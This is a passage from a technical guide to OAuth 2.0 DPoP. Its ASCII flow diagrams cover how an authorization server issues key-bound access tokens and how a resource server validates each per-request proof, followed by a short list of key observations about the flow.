│  │ 7. Validate iat is recent (within 60 seconds)         │     │
│  │ 8. Validate jti is unique (not seen before)           │     │
│  │ 9. Calculate JWK thumbprint: SHA256(public_jwk)       │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                   │
│  If valid: Continue                                              │
│  If invalid: Return error                                        │
│                                                                   │
│                                                                   │
│  STEP 6: Authorization Server Issues DPoP-Bound Token            │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Authorization Server creates access token with cnf claim:       │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ access_token = create_jwt({                            │     │
│  │   header: { alg: "RS256", typ: "at+jwt" },            │     │
│  │   payload: {                                           │     │
│  │     iss: "https://auth.example.com",                   │     │
│  │     sub: "user123",                                    │     │
│  │     aud: "https://api.example.com",                    │     │
│  │     exp: 1735779600,                                   │     │
│  │     scope: "read",                                     │     │
│  │     cnf: {                                             │     │
│  │       jkt: "<jwk_thumbprint>"  // Bind to public key  │     │
│  │     }                                                  │     │
│  │   }                                                    │     │
│  │ }, auth_server_private_key)                            │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                   │
│  Authorization Server → Client:                                  │
│  HTTP/1.1 200 OK                                                 │
│  Content-Type: application/json                                  │
│                                                                   │
│  {                                                               │
│    "access_token": "<jwt_with_cnf_claim>",                      │
│    "token_type": "DPoP",  ← NOT "Bearer"                        │
│    "expires_in": 3600,                                           │
│    "refresh_token": "<refresh_token>"                            │
│  }                                                               │
│                                                                   │
│                                                                   │
│  STEP 7: Resource Request with DPoP Proof                        │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Client creates NEW DPoP proof for resource request:             │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ dpop_proof = create_jwt({                              │     │
│  │   header: {                                            │     │
│  │     typ: "dpop+jwt",                                   │     │
│  │     alg: "ES256",                                      │     │
│  │     jwk: public_jwk  // Same public key               │     │
│  │   },                                                   │     │
│  │   payload: {                                           │     │
│  │     jti: "a2b4X_newUniqueId",  // NEW unique ID       │     │
│  │     htm: "GET",                 // HTTP method         │     │
│  │     htu: "https://api.example.com/resource",  // URI  │     │
│  │     iat: 1735776060,            // Current time        │     │
│  │     ath: base64url(sha256(access_token))  // Token hash│    │
│  │   }                                                    │     │
│  │ }, private_key)                                        │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                   │
│  Client → Resource Server:                                       │
│  GET /resource HTTP/1.1                                          │
│  Host: api.example.com                                           │
│  Authorization: DPoP <access_token>  ← DPoP token type          │
│  DPoP: <dpop_proof_jwt>              ← New DPoP proof           │
│                                                                   │
│                                                                   │
│  STEP 8: Resource Server Validates Token and DPoP Proof          │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Resource Server:                                                │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ 1. Extract access token from Authorization header      │     │
│  │ 2. Validate access token (signature, exp, aud, etc.)  │     │
│  │ 3. Extract cnf.jkt from access token                  │     │
│  │                                                        │     │
│  │ 4. Extract DPoP proof from DPoP header                │     │
│  │ 5. Decode DPoP proof JWT                              │     │
│  │ 6. Extract public key from DPoP proof jwk claim       │     │
│  │ 7. Verify DPoP proof signature with public key        │     │
│  │ 8. Validate typ = "dpop+jwt"                          │     │
│  │ 9. Validate htm = "GET" (matches request)             │     │
│  │ 10. Validate htu = "https://api.example.com/resource" │     │
│  │ 11. Validate iat is recent                            │     │
│  │ 12. Validate jti is unique                            │     │
│  │                                                        │     │
│  │ 13. Calculate JWK thumbprint of DPoP proof public key │     │
│  │ 14. Compare with cnf.jkt from access token            │     │
│  │     If mismatch: REJECT (wrong key!)                  │     │
│  │                                                        │     │
│  │ 15. Calculate SHA256(access_token)                    │     │
│  │ 16. Compare with ath from DPoP proof                  │     │
│  │     If mismatch: REJECT (wrong token!)                │     │
│  │                                                        │     │
│  │ ALL CHECKS PASSED ✓                                   │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                   │
│                                                                   │
│  STEP 9: Resource Server Grants Access                           │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Resource Server → Client:                                       │
│  HTTP/1.1 200 OK                                                 │
│  Content-Type: application/json                                  │
│                                                                   │
│  {                                                               │
│    "data": "Protected resource content",                         │
│    "user_id": "user123"                                          │
│  }                                                               │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

### 5.2 Key Observations

**Important Flow Characteristics:**

```
1. Key Pair is Long-Lived:
   - Generated once
   - Reused for multiple tokens
   - Can rotate periodically
   - But not per-request

2. DPoP Proof is Short-Lived:
   - Generated per request
   - Unique jti each time
   - Bound to specific request (htm, htu)
   - Single-use

3. Access Token is Bound:
   - Contains cnf.jkt (key thumbprint)
   - Cannot be used with different key
   - Still has expiration
   - But adds key binding layer

4. Two Validation Points:
   - Token endpoint: Validates DPoP proof, issues bound token
   - Resource server: Validates token AND DPoP proof

5. Token Type Changes:
   - Bearer token: Authorization: Bearer <token>
   - DPoP token: Authorization: DPoP <token>
   - Resource server must support DPoP
```

---

*[Document continues with sections 6-21 in Part 2...]*

*End of Part 1*
